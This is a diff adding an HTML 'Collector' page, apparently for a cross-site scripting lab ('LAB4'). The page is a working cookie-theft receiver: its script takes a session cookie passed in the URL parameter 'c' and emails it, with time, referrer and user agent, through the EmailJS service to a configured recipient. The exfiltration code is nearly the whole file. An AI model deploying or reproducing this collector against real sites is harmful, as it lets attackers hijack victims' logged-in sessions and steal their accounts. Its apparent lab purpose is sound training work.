@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Collector</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="emailjs-config.js"></script>
+</head>
+<body>
+<p>OK</p>
+<script>
+(function () {
+    try {
+        var params = new URLSearchParams(location.search);
+        var cookie = params.get('c') || '';
+        if (!cookie) return;
+
+        emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+
+        var now = new Date();
+        emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
+            name: 'XSS Capture',
+            from_name: 'XSS Capture',
+            from_email: 'xss-capture@singerean.digital',
+            subject: '[LAB4] PHPSESSIONID captured',
+            message: 'Captured cookie: ' + cookie +
+                     '\nTime: ' + now.toString() +
+                     '\nReferrer: ' + document.referrer +
+                     '\nUserAgent: ' + navigator.userAgent,
+            to_name: EMAILJS_CONFIG.RECIPIENT_NAME,
+            time: now.toLocaleString()
+        }).then(function (r) {
+            document.body.innerHTML += '<pre>sent</pre>';
+        }, function (err) {
+            document.body.innerHTML += '<pre>err: ' + JSON.stringify(err) + '</pre>';
+        });
+    } catch (e) {
+        document.body.innerHTML += '<pre>exception: ' + e.message + '</pre>';
+    }
+})();
+</script>
+</body>
+</html>
